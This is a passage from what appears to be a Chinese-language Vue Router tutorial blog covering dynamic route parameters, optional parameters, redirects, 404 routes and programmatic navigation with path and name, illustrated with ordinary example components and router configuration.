class="line">7</span><br></pre></td><td class="code"><pre><span class="line">...</span><br><span class="line">import router from &#x27;./router/index&#x27;</span><br><span class="line">...</span><br><span class="line">new Vue(&#123;</span><br><span class="line">  render: h =&gt; h(App),</span><br><span class="line">  router</span><br><span class="line">&#125;).$mount(&#x27;#app&#x27;)</span><br></pre></td></tr></table></figure><h1 id="声明式导航-动态路由传参"><a href="#声明式导航-动态路由传参" class="headerlink" title="声明式导航-动态路由传参"></a>声明式导航-动态路由传参</h1><h2 id="动态路由传参方式"><a href="#动态路由传参方式" class="headerlink" title="动态路由传参方式"></a>动态路由传参方式</h2><ul><li><p>配置动态路由</p><blockquote><p>动态路由后面的参数可以随便起名，但要有语义</p></blockquote><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> router = <span class="keyword">new</span> <span class="title class_">VueRouter</span>(&#123;</span><br><span class="line">  <span class="attr">routes</span>: [</span><br><span class="line">    ...,</span><br><span class="line">    &#123; </span><br><span class="line">      <span class="attr">path</span>: <span class="string">&#x27;/search/:words&#x27;</span>, </span><br><span class="line">      <span class="attr">component</span>: <span class="title class_">Search</span> </span><br><span class="line">    &#125;</span><br><span class="line">  ]</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure></li><li><p>配置导航链接</p><p>to&#x3D;”&#x2F;path&#x2F;参数值”</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;div class=&quot;hot-link&quot;&gt;</span><br><span class="line">  热门搜索：</span><br><span class="line">  &lt;router-link to=&quot;/search/黑马程序员&quot;&gt;黑马程序员&lt;/router-link&gt;</span><br><span class="line">  &lt;router-link to=&quot;/search/前端培训&quot;&gt;前端培训&lt;/router-link&gt;</span><br><span class="line">  &lt;router-link to=&quot;/search/如何成为前端大牛&quot;&gt;如何成为前端大牛&lt;/router-link&gt;</span><br><span class="line">&lt;/div&gt;</span><br></pre></td></tr></table></figure></li><li><p>对应页面组件<strong>接受参数</strong></p><p>$route.<strong>params</strong>.参数名</p><blockquote><p>params后面的参数名要和动态路由配置的参数保持一致</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&lt;p&gt;搜索关键字: &#123;&#123; $route.params.words &#125;&#125; &lt;/p&gt;</span><br><span class="line"></span><br><span class="line">&lt;script&gt;</span><br><span class="line">export default &#123;</span><br><span class="line">  name: &#x27;MyFriend&#x27;,</span><br><span class="line">  created () &#123;</span><br><span class="line">    // 在created中，获取路由参数</span><br><span class="line">    // this.$route.query.参数名 获取查询参数</span><br><span class="line">    // this.$route.params.参数名 获取动态路由参数</span><br><span class="line">    console.log(this.$route.params.words);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure></li></ul><h2 id="查询参数传参-VS-动态路由传参"><a href="#查询参数传参-VS-动态路由传参" class="headerlink" title="查询参数传参 VS 动态路由传参"></a>查询参数传参 VS 动态路由传参</h2><ol><li><p>查询参数传参  (比较适合传<strong>多个参数</strong>) </p><ol><li>跳转：to&#x3D;”&#x2F;path?参数名&#x3D;值&amp;参数名2&#x3D;值”</li><li>获取：$route.query.参数名</li></ol></li><li><p>动态路由传参 (<strong>优雅简洁</strong>，传单个参数比较方便)</p><ol><li>配置动态路由：path: “&#x2F;path&#x2F;:参数名” </li><li>跳转：to&#x3D;”&#x2F;path&#x2F;参数值”</li><li>获取：$route.params.参数名</li></ol><p>注意：动态路由也可以传多个参数，但一般只传一个</p></li></ol><h2 id="总结-4"><a href="#总结-4" class="headerlink" title="总结"></a>总结</h2><p>声明式导航跳转时, 有几种方式传值给路由页面？</p><ul><li>查询参数传参（多个参数）</li><li>动态路由传参（一个参数，优雅简洁）</li></ul><h1 id="动态路由参数的可选符"><a href="#动态路由参数的可选符" class="headerlink" title="动态路由参数的可选符"></a>动态路由参数的可选符</h1><h2 id="问题-3"><a href="#问题-3" class="headerlink" title="问题"></a>问题</h2><p>配了路由 <code>path:&quot;/search/:words&quot;</code>  为什么按下面步骤操作，会未匹配到组件，显示空白？</p><p><img src="/2023/12/28/Vue/1682497238305.png" alt="68249723830"></p><h2 id="原因"><a href="#原因" class="headerlink" title="原因"></a>原因</h2><p><code>/search/:words</code>  表示，<strong>必须要传参数</strong>。如果不传参数，也希望匹配，可以加个可选符”？”</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> router = <span class="keyword">new</span> <span class="title class_">VueRouter</span>(&#123;</span><br><span class="line">  <span class="attr">routes</span>: [</span><br><span class="line"> ...</span><br><span class="line">    &#123; <span class="attr">path</span>: <span class="string">&#x27;/search/:words?&#x27;</span>, <span class="attr">component</span>: <span class="title class_">Search</span> &#125;</span><br><span class="line">  ]</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><h1 id="Vue路由-重定向"><a href="#Vue路由-重定向" class="headerlink" title="Vue路由-重定向"></a>Vue路由-重定向</h1><h2 id="问题-4"><a href="#问题-4" class="headerlink" title="问题"></a>问题</h2><p>网页打开时， url 默认是 &#x2F; 路径，未匹配到组件时，会出现空白</p><p><img src="/2023/12/28/Vue/1682497872821.png" alt="68249787282"></p><h2 id="解决方案-2"><a href="#解决方案-2" class="headerlink" title="解决方案"></a>解决方案</h2><p><strong>重定向</strong> → 匹配 &#x2F; 后, 强制跳转 &#x2F;home 路径</p><h2 id="语法-4"><a href="#语法-4" class="headerlink" title="语法"></a>语法</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#123; <span class="attr">path</span>: 匹配路径, <span class="attr">redirect</span>: 重定向到的路径 &#125;,</span><br><span class="line">比如：</span><br><span class="line">&#123; <span class="attr">path</span>:<span class="string">&#x27;/&#x27;</span> ,<span class="attr">redirect</span>:<span class="string">&#x27;/home&#x27;</span> &#125;</span><br></pre></td></tr></table></figure><h2 id="代码演示-1"><a href="#代码演示-1" class="headerlink" title="代码演示"></a>代码演示</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">const router = new VueRouter(&#123;</span><br><span class="line">  routes: [</span><br><span class="line">    &#123; path: &#x27;/&#x27;, redirect: &#x27;/home&#x27;&#125;,</span><br><span class="line">  ...</span><br><span class="line">  ]</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><h1 id="Vue路由-404"><a href="#Vue路由-404" class="headerlink" title="Vue路由-404"></a>Vue路由-404</h1><h2 id="作用-5"><a href="#作用-5" class="headerlink" title="作用"></a>作用</h2><p>当路径找不到匹配时，给个提示页面</p><h2 id="位置"><a href="#位置" class="headerlink" title="位置"></a>位置</h2><p>404的路由，虽然配置在任何一个位置都可以，但一般都<strong>配置在其他路由规则的最后面</strong></p><h2 id="语法-5"><a href="#语法-5" class="headerlink" title="语法"></a>语法</h2><p>path: “*”   (任意路径) – 前面不匹配就命中最后这个</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> <span class="title class_">NotFind</span> <span class="keyword">from</span> <span class="string">&#x27;@/views/NotFind&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> router = <span class="keyword">new</span> <span class="title class_">VueRouter</span>(&#123;</span><br><span class="line">  <span class="attr">routes</span>: [</span><br><span class="line">    ...</span><br><span class="line">    &#123; <span class="attr">path</span>: <span class="string">&#x27;*&#x27;</span>, <span class="attr">component</span>: <span class="title class_">NotFind</span> &#125; <span class="comment">//最后一个</span></span><br><span class="line">  ]</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><h2 id="代码示例-8"><a href="#代码示例-8" class="headerlink" title="代码示例"></a>代码示例</h2><p>NotFound.vue</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&lt;template&gt;</span><br><span class="line">  &lt;div&gt;</span><br><span class="line">    &lt;h1&gt;404 Not Found&lt;/h1&gt;</span><br><span class="line">  &lt;/div&gt;</span><br><span class="line">&lt;/template&gt;</span><br><span class="line"></span><br><span class="line">&lt;script&gt;</span><br><span class="line">export default &#123;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">&lt;/script&gt;</span><br><span class="line"></span><br><span class="line">&lt;style&gt;</span><br><span class="line"></span><br><span class="line">&lt;/style&gt;</span><br></pre></td></tr></table></figure><p>router&#x2F;index.js</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> <span class="title class_">Home</span> <span class="keyword">from</span> <span class="string">&#x27;@/views/Home&#x27;</span></span><br><span class="line"><span class="keyword">import</span> <span class="title class_">Search</span> <span class="keyword">from</span> <span class="string">&#x27;@/views/Search&#x27;</span></span><br><span class="line"><span class="keyword">import</span> <span class="title class_">NotFound</span> <span class="keyword">from</span> <span class="string">&#x27;@/views/NotFound&#x27;</span></span><br><span class="line"><span class="keyword">import</span> <span class="title class_">Vue</span> <span class="keyword">from</span> <span class="string">&#x27;vue&#x27;</span></span><br><span class="line"><span class="keyword">import</span> <span class="title class_">VueRouter</span> <span class="keyword">from</span> <span class="string">&#x27;vue-router&#x27;</span></span><br><span class="line"><span class="title class_">Vue</span>.<span class="title function_">use</span>(<span class="title class_">VueRouter</span>) <span class="comment">// VueRouter插件初始化</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 创建了一个路由对象</span></span><br><span class="line"><span class="keyword">const</span> router = <span class="keyword">new</span> <span class="title class_">VueRouter</span>(&#123;</span><br><span class="line">  <span class="attr">routes</span>: [</span><br><span class="line">    &#123; <span class="attr">path</span>: <span class="string">&#x27;/&#x27;</span>, <span class="attr">redirect</span>: <span class="string">&#x27;/home&#x27;</span> &#125;,</span><br><span class="line">    &#123; <span class="attr">path</span>: <span class="string">&#x27;/home&#x27;</span>, <span class="attr">component</span>: <span class="title class_">Home</span> &#125;,</span><br><span class="line">    &#123; <span class="attr">path</span>: <span class="string">&#x27;/search/:words?&#x27;</span>, <span class="attr">component</span>: <span class="title class_">Search</span> &#125;,</span><br><span class="line">    &#123; <span class="attr">path</span>: <span class="string">&#x27;*&#x27;</span>, <span class="attr">component</span>: <span class="title class_">NotFound</span> &#125;</span><br><span class="line">  ]</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> router</span><br></pre></td></tr></table></figure><h1 id="编程式导航-两种路由跳转方式"><a href="#编程式导航-两种路由跳转方式" class="headerlink" title="编程式导航-两种路由跳转方式"></a>编程式导航-两种路由跳转方式</h1><h2 id="问题-5"><a href="#问题-5" class="headerlink" title="问题"></a>问题</h2><p>点击按钮跳转如何实现？</p><p><img src="/2023/12/28/Vue/1682500481059.png" alt="68250048105"></p><h2 id="方案"><a href="#方案" class="headerlink" title="方案"></a>方案</h2><p>编程式导航：用JS代码来进行跳转</p><h2 id="语法-6"><a href="#语法-6" class="headerlink" title="语法"></a>语法</h2><p>两种语法：</p><ul><li>path 路径跳转 （简易方便）</li><li>name 命名路由跳转 (适合 path 路径长的场景)</li></ul><h2 id="path路径跳转语法"><a href="#path路径跳转语法" class="headerlink" title="path路径跳转语法"></a>path路径跳转语法</h2><p>特点：简易方便</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//简单写法</span></span><br><span class="line"><span class="variable language_">this</span>.<span class="property">$router</span>.<span class="title function_">push</span>(<span class="string">&#x27;路由路径&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">//完整写法</span></span><br><span class="line"><span class="variable language_">this</span>.<span class="property">$router</span>.<span class="title function_">push</span>(&#123;</span><br><span class="line">  <span class="attr">path</span>: <span class="string">&#x27;路由路径&#x27;</span></span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><h2 id="name命名路由跳转"><a href="#name命名路由跳转" class="headerlink" title="name命名路由跳转"></a>name命名路由跳转</h2><p>特点：适合 path 路径长的场景</p><p>语法：</p><ul><li><p>路由规则，必须配置name配置项</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123; <span class="attr">name</span>: <span class="string">&#x27;路由名&#x27;</span>, <span class="attr">path</span>: <span class="string">&#x27;/path/xxx&#x27;</span>, <span class="attr">component</span>: <span class="variable constant_">XXX</span> &#125;,</span><br></pre></td></tr></table></figure></li><li><p>通过name来进行跳转</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable language_">this</span>.<span class="property">$router</span>.<span class="title function_">push</span>(&#123;</span><br><span class="line">  <span class="attr">name</span>: <span class="string">&#x27;路由名&#x27;</span></span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure></li></ul><h2 id="代码演示-2"><a href="#代码演示-2" class="headerlink" title="代码演示"></a>代码演示</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line">&lt;template&gt;</span><br><span class="line">  &lt;div class=&quot;home&quot;&gt;</span><br><span class="line">    &lt;div class=&quot;logo-box&quot;&gt;&lt;/div&gt;</span><br><span class="line">    &lt;div class=&quot;search-box&quot;&gt;</span><br><span class="line">      &lt;input type=&quot;text&quot;&gt;</span><br><span class="line">      &lt;button @click=&quot;goSearch&quot;&gt;搜索一下&lt;/button&gt;</span><br><span class="line">    &lt;/div&gt;</span><br><span class="line">    &lt;div class=&quot;hot-link&quot;&gt;</span><br><span class="line">      热门搜索：</span><br><span class="line">      &lt;router-link to=&quot;/search/黑马程序员&quot;&gt;黑马程序员&lt;/router-link&gt;</span><br><span class="line">      &lt;router-link to=&quot;/search/前端培训&quot;&gt;前端培训&lt;/router-link&gt;</span><br><span class="line">      &lt;router-link to=&quot;/search/如何成为前端大牛&quot;&gt;如何成为前端大牛&lt;/router-link&gt;</span><br><span class="line">    &lt;/div&gt;</span><br><span class="line">  &lt;/div&gt;</span><br><span class="line">&lt;/template&gt;</span><br><span class="line"></span><br><span class="line">&lt;script&gt;</span><br><span class="line">export default &#123;</span><br><span class="line">  name: &#x27;FindMusic&#x27;,</span><br><span class="line">  methods: &#123;</span><br><span class="line">    goSearch () &#123;</span><br><span class="line">      // 1. 通过路径的方式跳转</span><br><span class="line">      // (1) this.$router.push(&#x27;路由路径&#x27;) [简写]</span><br><span class="line">      // this.$router.push(&#x27;/search&#x27;)</span><br><span class="line"></span><br><span class="line">      // (2) this.$router.push(&#123;     [完整写法]</span><br><span class="line">      //         path: &#x27;路由路径&#x27; </span><br><span class="line">      //     &#125;)</span><br><span class="line">      // this.$router.push(&#123;</span><br><span class="line">      //   path: &#x27;/search&#x27;</span><br><span class="line">      // &#125;)</span><br><span class="line"></span><br><span class="line">      // 2. 通过命名路由的方式跳转 (需要给路由起名字) 适合长路径</span><br><span class="line">      //    this.$router.push(&#123;</span><br><span class="line">      //        name: &#x27;路由名&#x27;</span><br><span class="line">      //    &#125;)</span><br><span class="line">      this.$router.push(&#123;</span><br><span class="line">        name: &#x27;search&#x27;</span><br><span class="line">      &#125;)</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line">&lt;/script&gt;</span><br><span class="line"></span><br><span class="line">&lt;style&gt;</span><br><span class="line">...</span><br><span class="line">&lt;/style&gt;</span><br></pre></td></tr></table></figure><h1 id="编程式导航-path路径跳转传参"><a href="#编程式导航-path路径跳转传参" class="headerlink" title="编程式导航-path路径跳转传参"></a>编程式导航-path路径跳转传参</h1><h2 id="问题-6"><a href="#问题-6" class="headerlink" title="问题"></a>问题</h2><p>点击搜索按钮，跳转需要把文本框中输入的内容传到下一个页面如何实现？</p><p><img src="/2023/12/28/Vue/1682502720585.png" alt="68250272058"></p><h2 id="两种传参方式"><a href="#两种传参方式" class="headerlink" title="两种传参方式"></a>两种传参方式</h2><p>1.查询参数 </p><p>2.动态路由传参</p><h2 id="传参"><a href="#传参" class="headerlink" title="传参"></a>传参</h2><p>两种跳转方式，对于两种传参方式都支持：</p><p>① path 路径跳转传参</p><p>② name 命名路由跳转传参</p><h2 id="path路径跳转传参（query传参）"><a href="#path路径跳转传参（query传参）" class="headerlink" title="path路径跳转传参（query传参）"></a>path路径跳转传参（query传参）</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//简单写法</span></span><br><span class="line"><span class="variable language_">this</span>.<span class="property">$router</span>.<span class="title function_">push</span>(<span class="string">&#x27;/路径?参数名1=参数值1&amp;参数2=参数值2&#x27;</span>)</span><br><span class="line"><span class="comment">//完整写法</span></span><br><span class="line"><span class="variable language_">this</span>.<span class="property">$router</span>.<span class="title function_">push</span>(&#123;</span><br><span class="line">  <span class="attr">path</span>: <span class="string">&#x27;/路径&#x27;</span>,</span><br><span class="line">  <span class="attr">query</span>: &#123;</span><br><span class="line">    参数名<span class="number">1</span>: <span class="string">&#x27;参数值1&#x27;</span>,</span><br><span class="line">    参数名<span class="number">2</span>: <span class="string">&#x27;参数值2&#x27;</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><p>接受参数的方式依然是：<code>$route.query.参数名</code></p><h2 id="path路径跳转传参（动态路由传参）"><a href="#path路径跳转传参（动态路由传参）" class="headerlink" title="path路径跳转传参（动态路由传参）"></a>path路径跳转传参（动态路由传参）</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//简单写法</span></span><br><span class="line"><span class="variable language_">this</span>.<span class="property">$router</span>.<span class="title function_">push</span>(<span class="string">&#x27;/路径/参数值&#x27;</span>)</span><br><span class="line"><span class="comment">//完整写法</span></span><br><span class="line"><span class="variable language_">this</span>.<span class="property">$router</span>.<span class="title function_">push</span>(&#123;</span><br><span class="line">  <span class="attr">path</span>: <span class="string">&#x27;/路径/参数值&#x27;</span></span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><p>接受参数的方式依然是：<code>$route.params.参数值</code></p><p><strong>注意：</strong>path不能配合params使用</p><h2 id="代码示例-9"><a href="#代码示例-9" class="headerlink" title="代码示例"></a>代码示例</h2><p><em><strong>Home.vue</strong></em></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br></pre></td><td class="code"><pre><span class="line">&lt;template&gt;</span><br><span class="line">  &lt;div class=&quot;home&quot;&gt;</span><br><span class="line">    &lt;div class=&quot;logo-box&quot;&gt;&lt;/div&gt;</span><br><span class="line">    &lt;div class=&quot;search-box&quot;&gt;</span><br><span class="line">      &lt;input v-model=&quot;inpValue&quot; type=&quot;text&quot;&gt;</span><br><span class="line">      &lt;button @click=&quot;goSearch&quot;&gt;搜索一下&lt;/button&gt;</span><br><span class="line">    &lt;/div&gt;</span><br><span class="line">    &lt;div class=&quot;hot-link&quot;&gt;</span><br><span class="line">      热门搜索：</span><br><span class="line">      &lt;router-link to=&quot;/search/黑马程序员&quot;&gt;黑马程序员&lt;/router-link&gt;</span><br><span class="line">      &lt;router-link to=&quot;/search/前端培训&quot;&gt;前端培训&lt;/router-link&gt;</span><br><span class="line">      &lt;router-link to=&quot;/search/如何成为前端大牛&quot;&gt;如何成为前端大牛&lt;/router-link&gt;</span><br><span class="line">    &lt;/div&gt;</span><br><span class="line">  &lt;/div&gt;</span><br><span class="line">&lt;/template&gt;</span><br><span class="line"></span><br><span class="line">&lt;script&gt;</span><br><span class="line">export default &#123;</span><br><span class="line">  name: &#x27;FindMusic&#x27;,</span><br><span class="line">  data () &#123;</span><br><span class="line">    return &#123;</span><br><span class="line">      inpValue: &#x27;&#x27;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;,</span><br><span class="line">  methods: &#123;</span><br><span class="line">    goSearch () &#123;</span><br><span class="line">      // 1. 通过路径的方式跳转</span><br><span class="line">      // (1) this.$router.push(&#x27;路由路径&#x27;) [简写]</span><br><span class="line">      //     this.$router.push(&#x27;路由路径?参数名=参数值&#x27;)</span><br><span class="line">      // this.$router.push(&#x27;/search&#x27;)</span><br><span class="line">      // this.$router.push(`/search?key=$&#123;this.inpValue&#125;`)</span><br><span class="line">      // this.$router.push(`/search/$&#123;this.inpValue&#125;`)</span><br><span class="line"></span><br><span class="line">      // (2) this.$router.push(&#123;     [完整写法] 更适合传参</span><br><span class="line">      //         path: &#x27;路由路径&#x27;</span><br><span class="line">      //         query: &#123;</span><br><span class="line">      //            参数名: 参数值,</span><br><span class="line">      //            参数名: 参数值</span><br><span class="line">      //         &#125;</span><br><span class="line">      //     &#125;)</span><br><span class="line">      // this.$router.push(&#123;</span><br><span class="line">      //   path: &#x27;/search&#x27;,</span><br><span class="line">      //   query: &#123;</span><br><span class="line">      //     key: this.inpValue</span><br><span class="line">      //   &#125;</span><br><span class="line">      // &#125;)</span><br><span class="line">      // this.$router.push(&#123;</span><br><span class="line">      //   path: `/search/$&#123;this.inpValue&#125;`</span><br><span class="line">      // &#125;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">      // 2. 通过命名路由的方式跳转 (需要给路由起名字) 适合长路径</span><br><span class="line">      //    this.$router.push(&#123;</span><br><span class="line">      //        name: &#x27;路由名&#x27;</span><br><span class="line">      //        query: &#123; 参数名: 参数值 &#125;,</span><br><span class="line">      //        params: &#123; 参数名: 参数值 &#125;</span><br><span class="line">      //    &#125;)</span><br><span class="line">      this.$router.push(&#123;</span><br><span class="line">        name: &#x27;search&#x27;,</span><br><span class="line">        // query: &#123;</span><br><span class="line">        //   key: this.inpValue</span><br><span class="line">        // &#125;</span><br><span class="line">        params: &#123;</span><br><span class="line">          words: this.inpValue</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;)</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line">&lt;/script&gt;</span><br><span class="line"></span><br><span class="line">&lt;style&gt;</span><br><span class="line">...</span><br><span class="line">&lt;/style&gt;</span><br></pre></td></tr></table></figure><p><em><strong>Search.vue</strong></em></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">&lt;template&gt;</span><br><span class="line">  &lt;div class=&quot;search&quot;&gt;</span><br><span class="line">    &lt;p&gt;搜索关键字: &#123;&#123; $route.params.words &#125;&#125; &lt;/p&gt;</span><br><span class="line">    &lt;p&gt;搜索结果: &lt;/p&gt;</span><br><span class="line">    &lt;ul&gt;</span><br><span class="line">      &lt;li&gt;.............&lt;/li&gt;</span><br><span class="line">      &lt;li&gt;.............&lt;/li&gt;</span><br><span class="line">      &lt;li&gt;.............&lt;/li&gt;</span><br><span class="line">      &lt;li&gt;.............&lt;/li&gt;</span><br><span class="line">    &lt;/ul&gt;</span><br><span class="line">  &lt;/div&gt;</span><br><span class="line">&lt;/template&gt;</span><br><span class="line"></span><br><span class="line">&lt;script&gt;</span><br><span class="line">export default &#123;</span><br><span class="line">  name: &#x27;MyFriend&#x27;,</span><br><span class="line">  created () &#123;</span><br><span class="line">    // 在created中，获取路由参数</span><br><span class="line">    // this.$route.query.参数名 获取查询参数</span><br><span class="line">    // this.$route.params.参数名 获取动态路由参数</span><br><span class="line">    // console.log(this.$route.params.words);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&lt;/script&gt;</span><br><span class="line"></span><br><span class="line">&lt;style&gt;</span><br><span class="line">...</span><br><span class="line">&lt;/style&gt;</span><br></pre></td></tr></table></figure><h1 id="编程式导航-name命名路由传参"><a href="#编程式导航-name命名路由传参" class="headerlink" title="编程式导航-name命名路由传参"></a>编程式导航-name命名路由传参</h1><h2 id="name-命名路由跳转传参-query传参"><a href="#name-命名路由跳转传参-query传参" class="headerlink" title="name 命名路由跳转传参 (query传参)"></a>name 命名路由跳转传参 (query传参)</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span 